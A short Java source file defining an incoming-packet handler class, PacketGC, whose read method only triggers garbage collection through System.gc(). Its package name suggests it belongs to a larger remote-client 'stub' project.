package com.redpois0n.stub.packets.incoming;

public class PacketGC extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		System.gc();
	}

}
